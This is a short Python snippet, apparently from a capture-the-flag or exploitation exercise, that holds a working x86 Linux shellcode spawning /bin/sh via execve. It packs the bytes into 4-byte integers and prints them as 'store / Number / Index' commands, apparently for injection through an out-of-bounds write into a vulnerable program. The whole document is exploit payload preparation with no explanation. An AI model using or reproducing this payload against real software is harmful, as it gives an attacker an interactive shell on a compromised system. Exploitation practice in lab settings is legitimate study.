shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
ints = [int.from_bytes(shellcode[i:i+4], 'little')
        for i in range(0, len(shellcode), 4)]
for i, val in enumerate(ints):
    print(f"store\nNumber: {val}\nIndex: {i}")
